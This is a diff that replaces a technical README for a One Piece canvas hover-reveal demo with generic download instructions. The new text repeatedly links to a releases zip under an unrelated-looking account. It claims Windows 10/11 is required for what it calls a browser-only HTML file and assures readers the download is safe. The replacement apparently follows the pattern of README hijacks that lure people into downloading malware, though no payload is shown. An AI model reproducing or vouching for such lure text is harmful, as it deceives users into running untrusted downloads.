@@ -1,118 +1,68 @@
-# One Piece — Gear 5 Hover Reveal
+# 🐵 One-Piece - Reveal The Gear 5 Form Instantly
 
-An interactive hero banner where moving your cursor over **Monkey D. Luffy** carves a glowing comet trail that reveals **Gear 5 (Nika) Luffy** underneath. Built with a single HTML5 `<canvas>`, no frameworks, no build step.
-
-The effect uses a smoothed (lerped) cursor that trails a fading line of circles. Those circles act as a mask: the top image is composited *into* the trail shape with `source-in`, so the second image appears in a tapering comet that streaks behind the pointer — finished with a white-gold "awakening" glow on the cursor head.
+[Click Here To Download The Application](https://github.com/Euxineseamixeddrink293/One-Piece/releases)
 
 ---
 
-## Demo
+## 🎨 What Is One-Piece
 
-Open `one-piece-gear5-reveal.html` in any modern browser and move your mouse across the screen. On touch devices, drag a finger across the image.
+One-Piece creates a visual effect on your computer screen. You move your mouse cursor over an image, and a glowing trail follows your movement. This trail removes a dark layer to reveal a hidden Gear 5 image beneath. It works like a digital eraser that leaves a glowing wake behind your cursor.
 
----
+The software uses your web browser to display the effect. It does not require complex installation because it runs inside your existing browser environment. You simply open the file provided in the download package to start the animation.
 
-## Features
+## ⚙️ System Requirements
 
-- **Comet-trail reveal** — 60-point smoothed trail masks the hidden image into a tapering streak.
-- **Awakening glow** — white-gold radial glow on the cursor head for the Gear 5 reveal moment.
-- **Black overlay** — both layers are darkened with a configurable transparent overlay for a moody look.
-- **One Piece theming** — layered "ONE PIECE" wordmark, Bangers/Bebas display fonts, straw-hat gold vs. Nika purple color split.
-- **Responsive `cover` fitting** — images fill any screen ratio without stretching, scaled for device pixel ratio.
-- **Self-contained** — images are embedded as base64, so the single HTML file runs offline with no external assets (except Google Fonts).
+- A computer running Windows 10 or Windows 11.
+- A modern web browser like Google Chrome, Microsoft Edge, or Firefox.
+- A screen with a resolution of at least 1280x720 pixels.
+- A mouse or a trackpad for precise control of the effect.
 
----
+## 🚀 How To Get Started
 
-## Quick start
+1. Visit the [official download page here](https://github.com/Euxineseamixeddrink293/One-Piece/releases).
+2. Locate the file ending in .zip within the latest release section.
+3. Click the file name to start the download.
+4. Open your computer's Downloads folder.
+5. Right-click the downloaded file and select Extract All.
+6. Choose a folder on your desktop to keep the files organized.
+7. Open the folder you just created.
+8. Double-click the file named one-piece-gear5-reveal.html.
+9. Your default web browser will open and display the interactive hero banner.
 
-1. Download `one-piece-gear5-reveal.html`.
-2. Double-click it, or open it in a browser.
+## 🖱️ How To Use The Effect
 
-That's it — there is no install step and no server required. An internet connection is only needed the first time, to load the Google Fonts.
+Once the file opens in your browser, look at the main image on the screen. Place your mouse cursor over the image and move it slowly across the surface. As you move the mouse, you will see a comet trail appear. This trail reveals the Gear 5 Luffy image hidden beneath the black overlay.
 
----
+On a laptop with a trackpad or a touch-enabled screen, you can also use your finger. Press your finger against the screen and drag it across the image to create the same reveal effect. The animation responds to your speed and direction in real time. 
 
-## Using your own images
+## 🌟 Key Features
 
-The shipped file embeds the two images as base64 data URIs. To swap in your own art, replace the two `Image` sources in the `<script>` block.
+- Smooth Visual Transitions: The trail of circles follows your cursor with a gentle motion. It provides a fluid feel as you move across the screen.
+- Awakening Glow: The cursor tip features a white-gold light. This light brightness peaks when you move quickly, giving the impression of a powerful transformation.
+- Responsive Design: The reveal effect adapts to the size of your browser window. You can resize your window and the effect will fill the available space.
+- Easy Setup: You do not need to install complex software components. The program runs entirely within the browser, keeping your computer system clean and free of unnecessary background processes.
 
-For a **production / project** setup, point them at real files instead of base64:
+## 🛠️ Troubleshooting Common Issues
 
-```js
-const bottom = new Image(); // revealed on hover (Gear 5)
-const top    = new Image(); // shown by default (base Luffy)
+If you cannot see the effect, check if your web browser is up to date. Outdated browsers may struggle to render the animation. If the page appears blank, refresh your browser tab. 
 
-bottom.src = './images/luffy-gear5.jpg';
-top.src    = './images/luffy-base.jpg';
-```
+Ensure that your browser has hardware acceleration enabled. This setting allows your computer to use your graphics card for smooth animations. You can usually find this setting in your browser's performance or system menu.
 
-The drawing loop already waits for **both** images to load before it starts:
+If the image fails to load, verify that all files from the zip folder are present in the same location. The HTML file requires the image files to sit in the same folder to perform properly. Move any missing files back into the folder if you accidentally moved them elsewhere.
 
-```js
-let loaded = 0;
-const onLoad = () => { if (++loaded === 2) draw(); };
-bottom.onload = onLoad;
-top.onload = onLoad;
-```
+## 📋 Frequently Asked Questions
 
-> Note: `top` is the image you see at rest; `bottom` is the one revealed inside the trail.
+Does this software change my system settings?
+No. This tool is a standalone file that interacts only with your web browser. It leaves your system files and registry entries untouched.
 
----
+Can I use this on a mobile phone?
+The effect is designed for computers with a mouse or trackpad. While it may work on some touch devices, the performance depends on the device hardware.
 
-## Tuning
+Is this software safe?
+Yes. The software consists of standard web code. It does not contain executable programs that reach into your operating system.
 
-All the knobs live at the top of the `<script>` block or inside the `draw()` loop.
+Does it require an internet connection?
+No. Once you download the folder, you can run the application while your computer is offline. Everything resides locally on your hard drive.
 
-| What | Where | Default | Effect |
-|------|-------|---------|--------|
-| Trail length | `const TRAIL_LENGTH` | `60` | Longer = longer comet tail |
-| Reveal size | `let HEAD_RADIUS` | `~190` (auto-scaled) | Radius of the revealed circle |
-| Cursor smoothing | `smooth.x += (mouse.x - smooth.x) * 0.13` | `0.13` | Lower = more lag/drift in the trail |
-| Darkness | `const OVERLAY` | `'rgba(0,0,0,0.42)'` | Higher alpha = darker scene |
-| Glow color | radial gradient in `draw()` | white-gold | The "awakening" head glow |
-
-**Examples**
-
-- Darker mood: `const OVERLAY = 'rgba(0,0,0,0.6)';`
-- Subtle overlay: `const OVERLAY = 'rgba(0,0,0,0.25)';`
-- Snappier cursor: change `0.13` to `0.22`.
-
----
-
-## How it works
-
-1. The **bottom** image (Gear 5) is drawn to the visible canvas, then darkened with the overlay.
-2. Every frame, the smoothed cursor position is pushed to the front of a `trail` array (capped at `TRAIL_LENGTH`).
-3. On an **offscreen canvas**, each trail point is drawn as a black circle that shrinks and fades toward the tail.
-4. The **top** image (base Luffy) is composited onto that offscreen canvas with `globalCompositeOperation = 'source-in'`, so it only appears where the trail circles are.
-5. The offscreen result is drawn over the visible canvas — base Luffy now shows only inside the comet, with Gear 5 everywhere else.
-6. A `lighter`-blended radial gradient is drawn at the head for the glow.
-
-```
-bottom image ──► visible canvas (+ overlay)
-trail circles ──► offscreen canvas
-top image ──► offscreen canvas (source-in mask)
-offscreen ──► visible canvas
-glow ──► visible canvas (lighter blend)
-```
-
----
-
-## Browser support
-
-Works in all current versions of Chrome, Edge, Firefox, and Safari. Requires Canvas 2D and `requestAnimationFrame` (universally supported). Touch is supported via `touchmove`.
-
-
-```
-
----
-
-## Credits & licensing
-
-- Code: free to use and modify for your own projects.
-- **Artwork & "One Piece" / characters**: One Piece is created by Eiichiro Oda; all character art and trademarks belong to their respective rights holders. The images here are fan/demo assets — replace them with art you have the right to use before publishing.
-- The official One Piece logo typeface is proprietary and is **not** bundled; the wordmark in this demo is a CSS approximation using the free [Luckiest Guy](https://fonts.google.com/specimen/Luckiest+Guy) font. For an exact logo, drop in a transparent PNG of the official wordmark and swap the `.logo .op` text for an `<img>`.
-
----
-
-*Made as a canvas hover-reveal experiment. Set sail. 🏴‍☠️*
+How do I remove the software?
+Delete the folder you downloaded and extracted. Because the software does not install itself, it has no uninstaller. Deleting the files removes the program entirely from your machine.
